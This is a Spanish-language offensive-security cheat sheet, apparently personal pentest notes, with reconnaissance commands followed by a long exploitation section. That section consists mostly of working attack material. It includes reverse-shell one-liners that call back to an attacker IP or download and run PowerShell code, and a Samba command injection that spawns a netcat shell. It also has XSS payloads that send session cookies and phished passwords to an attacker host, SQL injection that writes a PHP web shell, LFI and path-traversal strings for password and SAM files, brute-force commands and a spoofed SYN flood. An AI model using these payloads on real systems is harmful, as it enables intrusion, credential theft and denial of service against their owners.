Obtención de info

OSINT
https://github.com/i3visio/osrframework
https://github.com/denmilu/OSINT_social_mapper
https://github.com/Greenwolf/social_mapper
https://github.com/lnxg33k/email-header-analyzer
https://github.com/Quantika14?tab=repositories

Legion
wappalyzer

whois (información general)

site:WEB filetype:cfg
mysql dump filetype:sql

/?-s // Para mostrar el código fuente en php
cutycapt --url=URL --out=captura.png [--insecure] // Hace una captura de pantalla de la web especificada

Crear diccionarios
	cewl -w DICC-OUTPUT.txt --with-numbers -a -e -d 5 -v URL

Crawling de emails
	theharvester -d URL -b all > mail.txt (-d usa todos los motores de búsqueda)
	SIMPLYEMAIL
		git clone https://github.com/killswitch-GUI/SimplyEmail.git
		pip install fake_useragent
		pip install BeautifulSoup
		pip install docx2txt
		python SimplyEmail.py -all -e URL
Metadatos de documentos
	metagoofil -d [url] -t [tipo de documento] -l [límite] -n [intentos] -o [archivo de salida] -f [archivo html que genera el programa]

DNS
	nslookup
		set type=mx (para obtener servidores de correo corporativos)
	DNS Zone Transfers
		host -t ns [url] // Para obtener el nameserver
		host -l [url] [nameserver] // Para intentar hacer el zone transfer y que muestre toda la lista de resoluciones DNS
	dnsrecon -d URL -t axfr
	dnsenum URL
	dig a/mx/axfr domain-name-here.com @nameserver

	***************************************************************************************************************
	// script.sh URL
		for server in $(host -t ns $1 | cut -d " " -f 4); do
		host -l $1 $server | grep "has address"
		done
	***************************************************************************************************************

	nmap --script=dns-service-discovery -p 5353 -sU

Enum directorios
	dirbuster
	gobuster -w WORDLIST -u URL -t 50 [-x php,txt,html,htm] [-k] (para saltar comprobación SSL) dir
	wfuzz --hc 404 -w /usr/share/wordlists/dirb/common.txt [IP]
	dirb URL DICC
	dirb URL -z 100 (Delay ms) (no hace falta diccionario)
	dirb URL -p IP:PUERTO // Usar un proxy
	uniscan -u URL -qweds
	ffuf.exe -recursion -u URL /FUZZ [-x PROXY] -t 10 -w common.txt -c -recursion-depth 2 -o salida.txt -p 0.1 -mc all [-fc 404,302,etc] [-fs TAMAÑO-RESPONSE]

Enum subdominios
	amass
	Miramos certificado y vemos el Alt name para ver para qué dominios está configurado el certificado

Obtención emails de webs
	Gather Contacts de Burp Suite

NMAP
	Escaneo tipo SYN -> -sS (Lista los puertos abiertos rápidamente enviando SYN y si recibe SYN/ACK envía un RST para cortar la conexión. Es más silencioso)
	Escaneo tipo XMAS -> -sX (Lista los puertos enviando paquetes FIN PSH y URH. Si recibe RST es que está cerrado, si no recibe respuesta está abierto o filtrado, y si recibimos error ICMP está filtrado. Es más silencioso que el tipo SYN, y sirve principalmente para escaneo de sistemas UNIX)
	Escaneo tipo TCP -> -sT (Lista los puertos abiertos rápidamente en caso de no tener privilegios suficientes, pero establece conexiones por lo que se guradarán logs en el sistema objetivo)
	Escaneo tipo ACK -> -sA (No lista puertos abiertos y cerrados, envía ACK y si devuelve RST es que no está filtrado, en caso de enviar algo distinto significa que está filtrado por un firewall
	 -sF Escaneo tipo FIN. Si recibe RST, está cerrado. Si no, está abierto o filtrado. En Windows un puerto cerrado ignora los FIN, por tanto parecerá que todos están open|filtered
	 -PT (Escaneo tipo ACK. Identifica puertos filtered si no recibe respuesta, en caso de que se sepa que está open|filtered)
	Tipo FIN + Tipo ACK para identificar Firewall
	 -sN (Escaneo tipo NULL. Envía paquetes sin flags. Si está cerrado devuelve RST, si no devuelve nada está open|filtered. Es mejor que el FIN porque algunos firewalls vigilan los paquetes FIN así que llega donde no llega el otro escaneo)
	 -sV (Servicios que corren en cada puerto abierto y sus versiones)
	 -sU (Lista los puertos UDP abiertos)
	 -ST -I (Reverse Ident. Identifica el usuario detrás de un proceso)
	 -sI -Pn ZOMBIE HOST (Zombie scan, usando a ZOMBIE como origen de los paquetes)
	 -O (Detección de S.O.)
	 -oA (Guarda la salida)
	 -oG (Guarda la salida formateada para poder usar grep)
	 -iL (input filename con IPs)
	 -f (fragmenta las cabeceras TCP para intentar evadir el firewall. Se usa sobre todo con -sS, -sX -sF y -sN)
	 --mtu [tamaño] (especifica un tamaño para el paquete <8,16,24,32...> para intentar confundir al firewall)
	 --source-port [puerto] (spoofea el puerto de origen para intentar entrar por un puerto permitido por el firewall)
	 --data-length [tamaño] (modifica el tamaño del escaneo, para que los firewalls piensen que no es un escaneo y permitan pasar el tráfico <probar tamaños grandes>)
	 --spoof-mac [Dirección MAC a spoofear, o podemos también poner Cisco y elegirá aleatoriamente una MAC de Cisco]
	 -T [Valor (Paranoid mode -> 0)] (Elige la frecuencia para enviar los paquetes)
	 -Pn (No se realiza ping al objetivo, presupone que está activo)
	 -D [Direcciones IP] (Elegimos direcciones que aparecerán como origen del escaneo)
	 -n (Indicamos que no resuelva DNS)
	 --random-hosts (Si elegimos varios hosts a escanear, aleatoriza el orden de escaneo)
	 -S IP (Spoof IP origen)
	 -g PUERTO (Usa ese puerto como origen)
	 -e INTERFAZ (interfaz a usar en caso de que haya varias)
	 --spoof-mac MAC (Spoof MAC origen)
	 -p80-90, 102 (Escanea del puerto 80 al 90, y el 102)
	 -D HOST1 HOST2 .... NUESTRA IP ..... HOSTN (Spoofea paquetes para que no vengan solo de nuestra máquina. Pueden estar online o no [lo que puede provocar un syn flood si es -sS])
	 -T[0-5] (Tiempo entre paquetes, cuanto mayor, más rápido)
	nmap -sC
	nmap -sS y luego -sV en los puertos que salgan
	
SMB
	use auxiliary/scanner/smb/smb_version
	enum4linux -U -M -S -P -G -d -r -l -o -i -n IP
	nbtscan -r RED
	smbclient -L //IP // Ya lo hace enum4linux. Lista recursos compartidos en la máquina con null session
	smbclient -U [username] -L [IP target] // Ya lo hace enum4linux
	smbclient -W DOMAIN -U USER \\\\COMPUTER_NAME\\NETLOGON
	smbclient --list=IP
	/usr/share/exploitdb/exploits/multiple/remote/10.c
		./sambaEx -d 0 -C 60 -S IP-RED (192.168.1) // Para listar máquinas en la red
		./sambaEx -b 0 (o la plataforma que sea) -v IP (Samba < 2.2.8)
	nmap --script smb-vuln* -p 139[,445] IP
	smb-enum-shares.nse -p445
	nbstat.nse -p 137 // Netbios expuestos
	smb-os-discovery.nse
	smb-enum-users.nse -p U:137,T:139

FTP
	use scanner/ftp/anonymous (Comprueba si se puede acceder de forma anónima mediante ftp)
		definir RHOSTS (targets)

RPC
	rpcinfo -p IP [apt-get install nfs-common]
	rpcclient -U ""/"USERNAME" --command=enumprivs -N IP // Enumerar privilegios
	rpcclient -U "" (Y después ir probando entre las comillas posibles usernames) IP
		Probamos con contraseñas vacías
	nmap --script msrpc-enum IP

NFS
	nmap -sV --script=nfs-showmount IP
	showmount -e IP
	mount IP:/directorio /mnt

TELNET
	use auxiliary/scanner/telnet/telnet_version

MYSQL
	use auxiliary/admin/mysql/mysql_enum
	
MSSQL
	nmap -p 1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER IP

VNC
	use auxiliary/scanner/vnc/vnc_none_auth

SMTP
	nc -v [ip] 25
	VRFY [usuario] Para comprobar si ese usuario existe y su email
	HELO asdf // Devuelve el nombre de dominio
	smtp-commands.nse

SSH
	use auxiliary/scanner/ssh/ssh_enumusers

SNMP
	DEFAULT PASS
	/usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt
	
	snmpwalk -c public IP 1.3.6.1.4.1.77.1.2.25 // Windows Users
	snmpwalk -c public IP 1.3.6.1.2.1.25.4.2.1.2 // Windows Processes
	snmpwalk -c public IP 1.3.6.1.2.1.6.13.1.3 // Open TCP Ports
	snmpwalk -c public IP 1.3.6.1.2.1.25.6.3.1.2 // Installed Software
  	snmpwalk -v 1(o la que sea) -c public(community name de snmp_login) IP

	snmpcheck -t IP -c public // Enumeración
	snmpenum -t IP
	onesixtyone -c NAMES -i HOSTS
	
	auxiliary/scanner/snmp/snmp_login
	auxiliary/scanner/snmp/snmp_enum

Magento
	wget https://github.com/steverobbins/magescan/releases/download/v1.12.9/magescan.phar
	php magescan.phar scan:all URL

Wordpress
	/wp-json/wp/v2/users y mirar los slug
	/?author=1
	/rss2 y /feed y mirar los creator
	En código fuente Wordpress, "ver=" o "v=" para buscar la versión de Wordpress
	xmlrpc.php
	
	wpscan 	NO ADMITE SITIOS .WORDPRESS.COM
	--url [url] --enumerate p (plugins)
	en vez de p, vp para plugins vulnerables
	vt para temas vulnerables
	u enumera usernames
	wpscan con enumeración de usuarios (-enumerate users)
	--disable-tls-checks
	Para escaneo de vulns con wpscan hace falta api key
	
	nmap -p80 --script http-wordpress-users.nse IP

Drupal
	XMLRPC
		drupalxml.xml =>
			<?xml version="1.0"?>
			<methodCall>
			<methodName>system.listMethods</methodName>
			<params>
			<param>
			</param>
			</params>
			</methodCall>

		curl --data @drupalxml.xml IP/xmlrpc.php

CMS
	https://github.com/FlorianHeigl/cms-explorer
	https://github.com/Tuhinshubhra/CMSeeK
	
	http-wordpress-enum.nse
	http-drupal-enum.nse
	http-drupal-enum-users.nse
	http-joomla-brute.nse

Angular
	developersSettings.json
	wwwroot: Dir ppal
		dist-desktop
		manifest.json
		.gitignore

Bluetooth
	bluetoothctl (entre otras cosas para ver dispositivos disponibles, quitar la visibilidad)
		scan on/off (comienza escaneo)
		devices (lista dispositivos, creo que los que han sido conectados alguna vez)
		discoverable on/off (activa o desactiva la visibilidad del ordenador)
		info [dev] (muestra información del dispositivo]
		pair [dev] (parea con un dispositivo)
		connect [dev] (conecta con un dispositivo)
	bluesnarfer

Esteganografía
	Análisis Espectograma
		wget https://code.soundsoftware.ac.uk/attachments/download/2439/SonicVisualiser-3.2.1-x86_64.AppImage
		/Layer/Add Spectogram/All channels mixed
	Análisis imagen
		wget http://www.caesum.com/handbook/Stegsolve.jar -O stegsolve.jar && chmod +x stegsolve.jar && ./stegsolve.jar

Sniffing Red local
	Antes de comenzar hay que permitir el Port Forwarding en nuestra máquina, modificamos el /proc/sys/net/ipv4/ip_forward de 0 a 1

	arpspoof (mirar --help) -i [interfaz a usar (wlan0)(puede ser opcional ponerlo)] -t [IP víctima] [IP a suplantar (puede ser la del router)]
		Hay que realizarlo dos veces, para suplantar ambas máquinas y capturar el tráfico de ambas
		Tras esto ya podemos sniffear el tráfico con Wireshark

	Wireshark -> Filtro "ftp" para ver solo el tráfico ftp, "tcp" para tcp, "http"
		ip.src == [IP] filtra por el tráfico que salga de esa IP, ip.dst == [IP] para destino
		Para unir filtros, con &&

WEB
	Nikto

Cifrado
	https://www.guballa.de/vigenere-solver
	https://f00l.de/hacking/vigenere.php
	https://www.dcode.fr/cifrado-vigenere
	https://geocaching.dennistreysa.de/multisolver/
	https://gchq.github.io/CyberChef/
	https://www.boxentriq.com/code-breaking/text-analysis

#################################################################################################
#################################################################################################
#################################################################################################

Explotación

METASPLOIT
	service postgresql start && msfdb init && msfconsole

PAYLOADS
	linux/x64/shell_reverse_tcp
	linux/x86/shell/reverse_tcp
	windows/shell/reverse_tcp
	msfvenom -p linux/x86/shell/reverse_tcp LHOST=IP LPORT=443  EXITFUNC=thread  -f python

Bruteforce
	hydra -l/-L user/userList -P dicc.lst -s PUERTO -f (cuando encuentra un resultado para) -t THREADS -vV URL http-get/post-form "/Path/:username=^USER^&password=^PASS^:Mensaje error"
	acccheck -t [IP target] -u [username]/ -U [usernames file] -p [password]/ -P [passwords file] (Prueba credenciales para inicio de sesión remota)
	HTTP Basic Auth
		nmap -p [80/443] --script http-brute --script-args 'http-brute.hostname=URL,http-brute.method=[GET/POST],http-brute.path=PATH_TO_LOGIN,userdb=USERS,passdb=PASS' -v URL -n
	patator ssh_login host=IP user=USER password=FILE0 0=PASS-FILE -x ignore:mesg='Authentication failed.'

DoS
	hping3 -a [IP que queremos spoofear] -p [Puerto target] -S (Indicamos que son paquetes SYN) --flood (Que inunde con paquetes) [IP target]

Android
	https://www.diawi.com // Subir la apk/ipa y poder instalarla desde otro dispositivo
	http://www.realmb.com/droidCert/ // Convertir certificado a Android

JAVA RMI
	use exploit/multi/misc/java_rmi_server

FTP
	hydra -L USERS.txt -P PASS.txt -vV IP ftp
	hydra -l USER -e nsr ftp://IP -v
	
	use auxiliary/scanner/ftp/ftp_login
	set user_file /usr/share/metasploit-framework/data/wordlists/unix_users.txt
	touch /usr/share/metasploit-framework/data/wordlists/blank.txt
	set pass_file /usr/share/metasploit-framework/data/wordlists/blank.txt
	set user_as_pass true
  	set BRUTEFORCE_SPEED 1

TOMCAT
	use auxiliary/admin/http/tomcat_administration // Probar creds de admin
	set BLANK_PASSWORDS true
	set USER_AS_PASS true
	use auxiliary/scanner/http/tomcat_mgr_login // Login de manager
	set BLANK_PASSWORDS true
	set USER_AS_PASS true

SMB
	Para acceder a los directorios -> smbclient \\\\[IP Target]\\[Share al que accedemos, carpeta compartida o Share por defecto] -U [username]
  	put [archivo] (sube el archivo al directorio del ordenador víctima)
	
	Si está habilitado logon
	smbclient -L IP
	{password is othing just hit enter}
	nc -lvp 7777
	smbclient //IP/tmp
	logon "/='nc NUESTRAIP 7777 -e /bin/bash'"
	
  	use exploit/multi/samba/usermap_script
  	Samba 3.0.
  		use auxiliary/scanner/smb/smb_ms17_010
		Si es vulnerable
			use exploit/windows/smb/ms17_010_eternalblue
  	Para WinXP =>
	smb-vuln-ms08-067.nse
	use auxiliary/scanner/smb/ms08_067_check
	use exploit/windows/smb/ms08_067_netapi => Puede que necesite bind_tcp
	payload windows/vncinject/bind_tcp

	https://www.hackingarticles.in/smb-penetration-testing-port-445/

POP3
	telnet IP 110
	USER usuario
	PASS password
	list
	retr NUMERO

SSH
	hydra -L USERS.txt -P PASS.txt -vV IP ssh
	
	ssh2john FicheroClave > ssh-key
	john ssh-key --wordlist=PATHTODICCIONARIO
	chmod 400 claveSSH porque si no no deja usarla
	ssh -i claveSSH	user@maquina

MySQL
	mysql -uUSUARIO -pPASSWORD -h HOST
	use auxiliary/scanner/mysql/mysql_login (Fuerza bruta login MYSQL)
	definir RHOSTS, PASS_FILE (diccionario), USER_FILE (usuarios)

Linux RLOGIN
	rsh/rlogin USUARIO@IP // Si está habilitado rlogin en el target

Reverse Shells
	Server local
		Recibida con nc -vvv -n -l -p PUERTO
	Máquina a explotar
	/usr/share/webshells/php/php-reverse-shell.php
	
	bash -i >& /dev/tcp/IP_DESTINO/NUM_PUERTO 0>&1 // Al usar el & se mantiene la shell aunque cerremos la terminal iniciadora
	bash -c "bash -i >& /dev/tcp/IP Atacante/Puerto Atacante 0>&1"
	mkfifo /tmp/pipe;sh /tmp/pipe | nc -l 4444 > /tmp/pipe Para crear bind nc
	php -r '$sock=fsockopen("IP",Puerto);exec("/bin/sh -i <&3 >&3 2>&3");'
	<?php
   	 exec("/bin/bash -c 'bash -i >& /dev/tcp/IP-NUESTRA/PUERTO-NUESTRO 0>&1'");
     	?>
	python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",Port));os.dup2(s.fileno(),0;os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
	0<&196;exec 196<>/dev/tcp/IP/PUERTO; sh <&196 >&196 2>&196& (el & final la pone en background)
	/bin/sh 0</tmp/backpipe | nc IP PUERTO 1>/tmp/backpipe
	/bin/sh -c "/bin/sh 0</tmp/backpipe | nc IP PUERTO 1>/tmp/backpipe"
	powershell "IEX (New-Object Net.WebClient).downloadString('http://IP:PUERTO/SHELL')"
	powershell -c "IEX(New-Object System.Net.WebClient).DownloadString (‘http://IP/p.ps1’); p.ps1 -c IP -p PORT -e cmd"
	Wordpress
		Editar hello.php de Hello Dolly y agregar
			if($_GET['cmd']) {
			  system($_GET['cmd']);
			  }
	NCAT
		ncat -v IP PUERTO --ssl
		ncat --exec cmd.exe --allow IP -vnl PUERTO --ssl
	
	awk 'BEGIN {system("/bin/sh")}' Para sacar shell si se tienen permisos con awk pro alguna razón
	:!bash // Shell desde Vi
	:set shell=/bin/bash:shell // Shell desde Vi
	python -c 'import pty;pty.spawn("/bin/bash")'
	echo os.system('/bin/bash')

	Con RCE si no se spawnea shell, probar pwd > pwd.txt y a ver si se ha creado el archivo

	find / -name wget // O los ficheros que queramos ver



WEB
	PHP 5.X probable => exploit/multi/http/php_cgi_arg_injection
	Con SSI (Server Side Includes), siempre que sea archivo shtml podemos ejecutar comandos remotos en el formulario como <!--#exec cmd="ls ../../"-->
	php://filter/convert.base64-encode/resource=index
	Para formularios que usen XML user:pass del tipo user=X and pass=Y:
		-> '(false) or 1=1(true) or 'a'='a(true) // and false de la pass

	Bypass de filtros
		Al poder subir archivos, si podemos elegir el nombre del archivo y no se chequea la entrada, podemos subirlos en otras localizaciones usando ../nombreArchivo
		Para bypassear filtro de extensión, poner .nuevaExtension

		Para bypassear filtro MIME, para imagen poner
			GIF89a
			%PDF-1.4
			al inicio de la shell

		Bypass filtro extensión
			shell.php%00.gif
			shell.jpg.php
			shell.PhP .pHp .PHp .php5
	LFI
		Si queremos enlazar un archivo y vemos que le adjunta una extensión automáticamente, llamarlo sin extensión y que se ponga después
		En caso de querer enlazar un archivo que no tenga extensión, poner %00 para que al añadirle la extensión no se tenga en cuenta
		Poner al final del archivo a visualizar /. para seguir en la misma carpeta y poder bypassear ciertos filtros
		Introducir directorios inexistentes ../../../etc/otro/../passwd o ../../../etc/./passwd o ../../../etc////passwd
		
		../../../../../../../../../../../etc/passwd%00. // Añadimos null byte y un caracter al final
	XST
		<script>var xhr = new XMLHttpRequest(); xhr.open('TRACE', 'IP', false); xhr.send(null); if(200 == xhr.status)  alert(xhr.responseText);</script>

	Path Traversal
		../../../../../../../../../../../windows/system32/drivers/etc/hosts
		../../../../../../../../../../../windows/system32/calc.exe
		../../../../../../../../../../../windows/system32/SysWOW64/calc.exe
		../../../../../../../../../../../windows/system32/cmd.exe
		../../../../../../../../../../../windows/system32/SysWOW64/cmd.exe
		../../../../../../../../../../../Users/Administrator/NTUser.dat
		../../../../../../../../../../../windows/system32/config/sam

	Wordpress =>
	
		Miramos config del plugin SMTP y vemos usuario y pass
		Usamos cliente smtp "evolution" para configurar cuenta de correo en el 143
	
		En Burp, al Repeater la petición GET, cambiamos por POST y añadimos de contenido:
		<methodCall>
		<methodName>system.listMethods</methodName>
		<params></params>
		</methodCall>

		Si está activo el wp.getUsersBlogs =>
			<methodCall>
			<methodName>wp.getUsersBlogs</methodName>
			<params>
			<param><value>user</value></param>
			<param><value>pass</value></param>
			</params>
			</methodCall>
		Si está activo el system.multicall y wp.getCategories =>
			<methodCall><methodName>system.multicall</methodName>

			 <member><name>methodName</name><value><string>wp.getCategories</string></value></member>
			 <member><name>params</name><value><array><data>
			 <value><string></string></value>
			 <value><string>admin</string></value>
			 <value><string>admin</string></value>

			 <member><name>methodName</name><value><string>wp.getCategories</string></value></member>
			 <member><name>params</name><value><array><data>
			 <value><string>admin</string></value>
			 <value><string>password</string></value>

			 <member><name>methodName</name><value><string>wp.getCategories</string></value></member>
			 <member><name>params</name><value><array><data>
			 <value><string></string></value>
			 <value><string>admin</string></value>
			 <value><string>admin</string></value>

			 <member><name>methodName</name><value><string>wp.getCategories</string></value></member>
			 <member><name>params</name><value><array><data>
			 <value><string></string></value>
			 <value><string>admin</string></value>
			 <value><string>admin</string></value>
			</methodCall>

		Si está activo el system.multicall y wp.getUsersBlogs =>

			<methodCall><methodName>system.multicall</methodName><params><param><value><array><data>
			<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>user</string></value><value><string>pass1</string></value></data></array></value></data></array></value></member></struct></value>
			<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>user</string></value><value><string>pass2</string></value></data></array></value></data></array></value></member></struct></value>
			<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>user</string></value><value><string>pass3</string></value></data></array></value></data></array></value></member></struct></value>
			<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>user</string></value><value><string>pass4</string></value></data></array></value></data></array></value></member></struct></value>
			</data></array></value></param></params></methodCall>

		Para crear entradas =>
			<methodCall>
			<methodName>wp.newPost</methodName>
			<params>
				<param><value>what is this parameter</value></param>
				<param><value>user</value></param>
				<param><value>pass</value></param>
				<param><struct>
					<member><name>post_title</name><value>test post</value></member>
					<member><name>post_content</name><value>any HTML content here</value></member>
					<member><name>post_excerpt</name><value>excerpt</value></member>
				</struct></param>
			</params>
			</methodCall>

		Para subir archivos =>
			<methodCall>
			<methodName>metaWeblog.newMediaObject</methodName>
			<params>
				<param><value>what is this parameter</value></param>
				<param><value>user</value></param>
				<param><value>pass</value></param>
				<param><struct>
					<member><name>name</name><value>file_name.html</value></member>
					<member><name>type</name><value>text/plain</value></member>
					<member><name>bits</name><value>file contents, any data format XML-encoded</value></member>
				</struct></param>
			</params>
			</methodCall>

		========================
		También con wp.uploadFile

	Magento
		/soap
		/soap/default?wsdl_list=1
		https://github.com/magento/magento2/blob/2.3/app/code/Magento/Customer/etc/webapi.xml

		Content-Type:application/xml

		POST /rest/V1/integration/admin/token HTTP/1.1
		<login><username>admin</username><password>123123q</password></login>

		POST /rest/V1/integration/customer/token HTTP/1.1
		<login><username>EMAIL</username><password>PASS</password></login>

		---
		POST /rest/V1/customers/isEmailAvailable HTTP/1.1
		Content-Type:application/json
		{
		"customerEmail": "EMAIL",
		"websiteId": 1
		}

		---
		https://github.com/steverobbins/magescan
		php magescan.phar scan:all www.example.com
		
		Graphql
		
			Enum queries
			
			POST /graphql HTTP/1.1
			Host: XXXX
			User-Agent: XXXX
			Accept-Encoding: gzip, deflate
			Accept: */*
			Connection: close
			Content-Length: 2321
			Content-Type: application/json

			{"query": "query IntrospectionQuery {                __schema {                queryType { name }                mutationType { name }                subscriptionType { name }                types {                    ...FullType                }                directives {                    name                    description                    locations                    args {                    ...InputValue                    }                }                }            }            fragment FullType on __Type {                kind                name                description                fields(includeDeprecated: true) {                name                description                args {                    ...InputValue                }                type {                    ...TypeRef                }                isDeprecated                deprecationReason                }                inputFields {                ...InputValue                }                interfaces {                ...TypeRef                }                enumValues(includeDeprecated: true) {                name                description                isDeprecated                deprecationReason                }                possibleTypes {                ...TypeRef                }            }            fragment InputValue on __InputValue {                name                description                type { ...TypeRef }                defaultValue            }            fragment TypeRef on __Type {                kind                name                ofType {                kind                name                ofType {                    kind                    name                    ofType {                    kind                    name                    ofType {                        kind                        name                        ofType {                        kind                        name                        ofType {                            kind                            name                            ofType {                            kind                            name                            }                        }                        }                    }                    }                }                }            }"}

	Bypass de filtros
		XSS
			test+(<script>alert(1)</script>)@example.com
			test@example(<script>alert(1)</script>).com
			"<script>alert(1)</script>"@example.com
		SQLi
			"' or 1=1 -- '"@example.com
			"mail'); drop table users;--"@example.com

	XSS
		http://xss.rocks/xss.js
		<script>alert("SecurityTest");</script>
		%3cscript%3ealert%28123%29%3c%2fscript%3e
		<iframe src=http://></iframe>
		<img src=x onerror="&#97&#108&#101&#114&#116&#96&#120&#115&#115&#96">

		<embed><embed src="jav&Tab;ascript:al&Tab;ert()"
		<svg onload="alert(document.cookie)">
		<div onpointerrawupdate=alert(1) style=width:100%;height:100%;position:absolute;background-color:red>test
		
		<img src=x onerror=alert('XSS');> 
		<img src="" />
		<img src="" onerror="alert(document.cookie)" />
		<iframe src="javascript:alert('Hacked');" />
		<iframe src="javascript:alert('SecurityTest');" />
		<script>alert(document.cookie)</script> Para obtener la cookie de sesión
		href="javascript:alert('test')"
		<script>window.location="http://URL CON ALGO A EJECUTAR, COMO UNA SHELL"</script> Para ejecutar algo de forma remota
		window.location = "https://google.es"; Se puede usar para dejar inaccesible una web en caso de stored xss
		También document.location.href = "https://google.es";
		También document.location.href = "https://google.es";
		También location.assign("https://google.es");
		También location.replace("https://google.es");
		"><body onLoad="document.location.href='WEB MALICIOSA'"> // Redirige al cargar la página que contiene lo insertado
		"><meta http-equiv="accion" content="10"; url="WEB MALICIOSA" /> // Redirección al pasar 10 segundos

		Con location.reload(); forzamos el recargado de la página
		    <script>
			for (;;)
			    location.reload(); // Y hacemos una denegación de servicio
		    </script>

		window.open(URL); Para abrir en nueva pestaña una página.

		<script>
		var password = window.prompt("La sesión ha terminado. Por favor, vuelva a introducir su clave:");
		document.location.href="http://superjuacker.net/leerpass.php?p=" + password;
		</script>

		document.location.href = "http://superjuacker.net/recibir.php?ck="+ document.cookie; Para mandar la cookie a una web nuestra

		**Para forzar un persistent xss** si se inserta en un campo value se puede hacer "><script>alert();</script> para cerrar el value e introducir el xss.
		También se puede mandar encondeado, o en hexadecimal

	SQL INJECTION
	
		' or '1'='1--
		' or 1=1--
		Para SQL injection con forma "?palabra=3" podemos poner "?palabra=3 union all select *, *, *, ... (las columnas que creamos que tiene) from [tabla que queremos ver]"
		Los comentarios pueden ser con -- o con #
		Ponemos ' o ; y si es vulnerable, a probar
		1(o un valor válido) order by 1 # E ir probando 10, 20, si da error 15, y vamos acotando, hasta llegar al último que no dé error
		1(o un valor válido) union select 1 -- y luego 1(o un valor válido) union select 1, 2 -- Hasta que no dé error.
		También concat(user,0x3a,password) from 'users' Para acceder a campos internos
		
		Getting tables in current Database
			table_name from information_schema.tables where table_schema=database() limit 0,1
		Columns
			column_name from information_schema.columns where table_schema=database() and table_name='users' (o la que queramos ver) limit 0,1
		Count number of columns
			count(username) from users
		Dump
			ount(username,0x3a,password) from users limit 0,1
			concat_ws(0x7e,id, username, password)
		
		Proceso obtención datos:
		select distinct(table_schema), null from information_schema.tables -- Para ver las bases de datos que hay
		select distinct(table_name), null from information_schema.columns;# Para ver las tablas que hay
		select distinct(column_name), null from information_schema.columns;# Para ver las columnas que hay
		select * from tabla_a_ver;# Para ver contenido
		SELECT * FROM mysql.user
		SELECT User from mysql.user
			concat(mysql,0x2e,user)

		concat_ws(':',id, username, password)
		
		Enumeración de columnas:
		' having 1=1-- al no tener el group by, dará error y puede mostrar la columna. Después hacemos ' group by [tabla.columna mostrada] having 1=1-- y mostrará la siguiente. Después concatenamos ' group by [tabla.columna mostrada], [tabla.columna mostrada2] having 1=1-- Hasta que no dé error
		Enumeración de tipos de columnas:
		' union select sum(COLUMNA) from TABLA -- Y dará error diciendo qué tipo de campo es
		' or '1'='1 LIMIT 1 INTO OUTFILE ' /var/www/shell.php' LINES TERMINATED BY '<? system($_REQUEST['cmd']); ?>'-- (Si lo filtra hay que pasarlo a hex, base64, urlencode, ascii hex... Hasta que no lo filtre, en ese caso sin comillas)
		Se accede mediante /shell.php?cmd=comando a ejecutar
		' union select 1, 2, 3 into dumpfile 'archivo.txt' #
		SELECT "<?php passthru($_GET['cmd']); ?>" into dumpfile '/var/www/html/shell.php'; Para insertar shell si se tiene acceso con privilegios

		SQL Injection en Where (UPDATE o DELETE, muestra la salida en el error que aparece):
			en el parámetro vulnerable: param=extractvalue(0x0a,concat(0x0a,(select+table_name+from+information_schema.tables))%0d%0a
			+limit+X,1) si devuelve más de una columna y da error
			view=-35" and extractvalue(0x0a,concat(0x0a,(select database())))--
			https://www.exploit-db.com/docs/33253
		
		Oracle
			--comment
		Microsoft
			--comment
			/*comment*/
		PostgreSQL
			--comment
			/*comment*/
		MySQL
			#comment
			-- comment [Note the space after the double dash]
			/*comment*/
		
		MySQL
			@@datadir
			@@version Para la versión
			@@port Para el puerto
			@@hostname Para el usuario
			@@version_compile_os Para el SO donde se compiló el programa de gestión de base de datos
			Con LOAD_FILE('[ruta del archivo]') # Podemos leer archivos
		
		MSSQL
			version()
			También user() y database()
			DB_NAME() en MSSQL
			SELECT name FROM master..sysdatabases -- 
			name FROM master..syslogins -- // name FROM master.sys.sql_logins -- 
			user_name() -- // system_user -- // user -- 
			HOST_NAME() -- 
			SELECT TOP 10 * from information_schema.tables union select 1,2,3,4

		SQLMAP
			Importante --tor y --check-tor
				-g [dork]
			    sqlmap -u "http://192.168.56.101/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=261b124tdh0nschc1oqt1nohj2" --current-user --current-db
			    --string="Surname" Para especificar el campo a emplear
			    -U [usuario de la base de datos] --privileges Para listar privilegios del usuario
				-u [url] --dbs (lista las bases de datos)
				quitando --dbs y añadiendo -D [base de datos que queramos consultar] --tables (indica que queremos ver las tablas que tiene)
				quitando --tables y añadiendo -T [tabla a consultar] --columns (muestra las columnas)
				quitando --columns y añadiendo -C [columna a consultar, pudiendo poner varios con coma (user, password)] --dump (muestra los campos de esa columna) o --dump-all (para mostrar todos los de esa tabla, database o columna seleccionada)
				--random-agent simula petición aleatoria de cualquier navegador
			    --hostname devuelve el nombre de la maquina objetivo
			    --is-dba devuelve si el usuario con el que ejecutamos las sentencias SQL es root o no
			    --os-shell se usa si el anterior ha devuelto True y devuelve una ventana de comandos en el sistema objetivo
			    --current-db muestra el DBMS actual
			    --users muestra los usuarios de la base de datos
			    --passwords muestra las contraseñas de los usuarios anteriores

			sqlmap.py -r TXT-PETICION --proxy http://127.0.0.1:8080 (Por Burp) --level=5 --risk=3  --thread=10 [--dbms="Microsoft SQL Server"] --current-user --current-db --hostname --dbs

	XXE
		<?xml version="1.0" encoding="UTF-8"?>
		<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
		<svg>&xxe;</svg>

		En upload file
